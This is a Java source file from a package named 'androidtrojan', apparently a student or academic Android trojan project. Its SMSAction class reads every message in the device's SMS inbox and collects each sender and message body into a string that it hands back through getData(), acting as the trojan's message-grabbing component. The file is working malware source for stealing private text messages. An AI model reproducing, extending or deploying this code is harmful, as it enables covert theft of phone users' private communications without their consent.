package il.ac.colman.androidtrojan.Actions;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SMSAction implements ATAction {
	//class fields:
	private String _sms;
	private Context _context;

	//ctor:
	public SMSAction(Context _context) {
		//super:
		super();
		//adding the context:
		this._context = _context;
		
		//using methods to set _sms:
		this._sms = collectAndSend();
	}
	
	//setters & getters:
	public String get_sms() {
		return _sms;
	}
	
	//sms grabber method:
	private String collectAndSend() {
		Uri uriSMSURI = Uri.parse("content://sms/inbox");
		Cursor cur = _context.getContentResolver().query(uriSMSURI, null, null, null,
				null);
		String sms = "";
		while (cur.moveToNext()) {
			sms += "From :" + cur.getString(2) + " : " + cur.getString(12)
					+ "\n";
		}
		
        //returning the smss string:
		return sms;
	}

	@Override
	public String getData() {
		// TODO Auto-generated method stub
		return _sms;
	}
}
